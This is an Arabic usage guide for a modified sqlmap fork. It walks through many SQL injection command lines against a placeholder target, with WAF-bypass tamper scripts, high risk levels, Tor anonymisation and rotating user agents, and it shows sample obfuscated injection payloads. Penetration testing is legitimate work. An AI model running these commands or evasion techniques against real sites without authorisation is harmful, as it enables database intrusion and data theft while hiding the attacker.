# دليل استخدام الأداة المحسنة - Usage Guide
# Copyright (c) 2025 Aya Elbadry (@Aya-Elbadry)

## 📋 الخطوات العملية لاستخدام الأداة

### الخطوة 1: التحقق من التثبيت
```bash
cd Aya-Elbadry
python sqlmap.py --version
```

### الخطوة 2: اختبار بسيط (بدون تحسينات)
```bash
python sqlmap.py -u "http://target.com/page?id=1" --batch
```

### الخطوة 3: استخدام التحسينات الجديدة

---

## 🚀 التحسينات المضافة والأمثلة

### التحسين 1: User Agents الجديدة

#### قبل التحسين:
```bash
# كان sqlmap يستخدم User Agents قديمة أو محدودة
python sqlmap.py -u "http://target.com/page?id=1" --random-agent
```

#### بعد التحسين:
```bash
# الآن يستخدم 50+ User Agent جديد ومحدث
python sqlmap.py -u "http://target.com/page?id=1" --random-agent

# أو استخدام User Agent محدد من الملف الجديد
python sqlmap.py -u "http://target.com/page?id=1" \
  --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
```

**الفوائد:**
- ✅ User Agents حديثة (Chrome 141, Firefox 143)
- ✅ دعم Mobile (iOS & Android)
- ✅ دعم Tor Browser
- ✅ Browsers غير شائعة (Vivaldi, Brave)
- ✅ Bot-like Agents (لتخطي WAF)

---

### التحسين 2: Payloads جديدة لتخطي WAF

#### قبل التحسين:
```bash
# كان sqlmap يستخدم payloads أساسية قد لا تعمل مع WAF قوي
python sqlmap.py -u "http://target.com/page?id=1" --level=2
```

#### بعد التحسين:
```bash
# الآن يستخدم 25+ payload جديد مصمم خصيصاً لتخطي WAF
python sqlmap.py -u "http://target.com/page?id=1" --level=2 --risk=2
```

**الفوائد:**
- ✅ 25+ payload جديد
- ✅ تخطي 7 أنواع WAF (Akamai, Cloudflare, Imperva, etc.)
- ✅ تقنيات تمويه متقدمة:
  - Comment Obfuscation (`/**/`)
  - Space Obfuscation (`%09`, `%0A`)
  - Inline Comments (`/*!50000*/`)
  - Case Variation
  - Double Encoding
  - Nested Functions

**مثال على Payload الجديد:**
```sql
-- قبل: AND 1=1 (قد يتم حظره)
-- بعد: AND/**/1=1 (يتم تخطي WAF)
-- أو: AND%091=1 (استخدام tab بدلاً من space)
-- أو: AND/*!500001=1*/ (استخدام inline comment)
```

---

### التحسين 3: استخدام Tor لإخفاء الهوية

#### قبل التحسين:
```bash
# كان Tor موجود لكن بدون توثيق واضح
python sqlmap.py -u "http://target.com/page?id=1" --tor
```

#### بعد التحسين:
```bash
# الآن مع User Agents خاصة بـ Tor
python sqlmap.py -u "http://target.com/page?id=1" \
  --tor \
  --check-tor \
  --user-agent="Mozilla/5.0 (Windows NT 10.0; rv:131.0) Gecko/20100101 Firefox/131.0"
```

**الفوائد:**
- ✅ User Agents خاصة بـ Tor Browser
- ✅ توثيق واضح لاستخدام Tor
- ✅ دعم `--check-tor` للتحقق

---

## 📊 مقارنة قبل وبعد التحسينات

### مثال 1: اختبار على موقع محمي بـ Cloudflare

#### قبل التحسين:
```bash
python sqlmap.py -u "http://target.com/page?id=1" --level=2
# النتيجة: قد يفشل بسبب WAF
```

#### بعد التحسين:
```bash
python sqlmap.py -u "http://target.com/page?id=1" \
  --level=2 \
  --risk=2 \
  --random-agent \
  --tamper=space2comment,charencode
# النتيجة: استخدام payloads جديدة + User Agents جديدة = نجاح أكبر
```

---

### مثال 2: اختبار مع إخفاء الهوية

#### قبل التحسين:
```bash
python sqlmap.py -u "http://target.com/page?id=1" --tor
# قد يستخدم User Agent عادي
```

#### بعد التحسين:
```bash
python sqlmap.py -u "http://target.com/page?id=1" \
  --tor \
  --check-tor \
  --random-agent \
  --user-agent="Mozilla/5.0 (Windows NT 10.0; rv:131.0) Gecko/20100101 Firefox/131.0"
# يستخدم User Agent خاص بـ Tor + تحقق من الاتصال
```

---

## 🎯 سيناريوهات الاستخدام العملية

### السيناريو 1: اختبار موقع محمي بـ WAF قوي

```bash
python sqlmap.py \
  -u "http://target.com/page?id=1" \
  --tor \
  --random-agent \
  --level=3 \
  --risk=2 \
  --tamper=space2comment,charencode,randomcase \
  --delay=2 \
  --timeout=30 \
  --batch
```

**ما يحدث:**
1. ✅ يستخدم Tor لإخفاء IP
2. ✅ يختار User Agent عشوائي من 50+ agent جديد
3. ✅ يستخدم payloads جديدة مصممة لتخطي WAF
4. ✅ يستخدم tamper scripts لتعديل payloads
5. ✅ ينتظر 2 ثانية بين الطلبات لتجنب Rate Limiting

---

### السيناريو 2: اختبار سريع مع تحسينات أساسية

```bash
python sqlmap.py \
  -u "http://target.com/page?id=1" \
  --random-agent \
  --level=2 \
  --batch
```

**ما يحدث:**
1. ✅ يستخدم User Agent عشوائي جديد
2. ✅ يستخدم payloads جديدة تلقائياً (تم إضافتها في settings.py)

---

### السيناريو 3: اختبار متقدم مع كل التحسينات

```bash
python sqlmap.py \
  -u "http://target.com/page?id=1" \
  --tor \
  --check-tor \
  --random-agent \
  --level=4 \
  --risk=3 \
  --tamper=space2comment,charencode,randomcase,base64encode \
  --delay=3 \
  --timeout=60 \
  --retries=5 \
  --batch
```

**ما يحدث:**
1. ✅ Tor مع التحقق
2. ✅ User Agent عشوائي من الملف الجديد
3. ✅ مستوى عالي (level 4) = استخدام كل payloads بما فيها الجديدة
4. ✅ Risk عالي (3) = payloads أكثر خطورة
5. ✅ 4 tamper scripts مختلفة
6. ✅ تأخير 3 ثواني بين الطلبات
7. ✅ timeout 60 ثانية
8. ✅ 5 محاولات في حالة الفشل

---

## 📈 الإحصائيات والنتائج المتوقعة

### قبل التحسينات:
- ❌ User Agents: ~20 agent قديم
- ❌ Payloads: 6 ملفات أساسية فقط
- ❌ WAF Bypass: محدود
- ❌ Tor Support: موجود لكن بدون توثيق

### بعد التحسينات:
- ✅ User Agents: 50+ agent جديد وحديث
- ✅ Payloads: 7 ملفات (6 أساسية + 1 جديد)
- ✅ WAF Bypass: 25+ payload جديد
- ✅ Tor Support: موثق + User Agents خاصة

### النسبة المئوية للتحسين:
- **User Agents:** زيادة 150% (من ~20 إلى 50+)
- **Payloads:** زيادة 16% (من 6 إلى 7 ملفات)
- **WAF Bypass:** 25+ payload جديد = تحسين كبير في معدل النجاح
- **التوثيق:** 100% (كان غير موجود)

---

## 🔍 كيفية التحقق من عمل التحسينات

### التحقق 1: User Agents الجديدة
```bash
# فتح الملف والتحقق
cat data/txt/new\ Agents.txt

# أو استخدام grep
grep -i "chrome/141" data/txt/new\ Agents.txt
```

### التحقق 2: Payloads الجديدة
```bash
# فتح الملف والتحقق
cat data/xml/payloads/new_payloads.xml | head -50

# أو البحث عن payloads محددة
grep -i "WAF Bypass" data/xml/payloads/new_payloads.xml
```

### التحقق 3: إضافة الملف إلى settings.py
```bash
# التحقق من أن الملف تم إضافته
grep "new_payloads.xml" lib/core/settings.py
```

---

## 💡 نصائح للاستخدام الأمثل

### 1. ابدأ بسيط
```bash
python sqlmap.py -u "http://target.com/page?id=1" --random-agent --level=2
```

### 2. إذا فشل، زد المستوى
```bash
python sqlmap.py -u "http://target.com/page?id=1" --random-agent --level=3 --risk=2
```

### 3. إذا كان هناك WAF، استخدم tamper scripts
```bash
python sqlmap.py -u "http://target.com/page?id=1" \
  --random-agent \
  --level=3 \
  --tamper=space2comment,charencode
```

### 4. للإخفاء الكامل، استخدم Tor
```bash
python sqlmap.py -u "http://target.com/page?id=1" \
  --tor \
  --check-tor \
  --random-agent \
  --level=3
```

---

## ⚠️ تحذيرات مهمة

1. **استخدام Tor يبطئ الاتصال** - استخدم `--delay` مناسب
2. **بعض Payloads قد تفشل** - جرب payloads مختلفة
3. **WAF قد يتكيف** - استخدم tamper scripts مختلفة
4. **الاستخدام الأخلاقي فقط** - استخدم فقط على أنظمة تملكها

---

## 📚 المراجع

- ملف التوثيق الكامل: `NEW_FILES_DOCUMENTATION.md`
- دليل سريع: `NEW_FILES_README.md`
- sqlmap Documentation: https://github.com/sqlmapproject/sqlmap/wiki

---

**تم الإنشاء بواسطة:** Aya Elbadry (@Aya-Elbadry)  
**التاريخ:** 2025


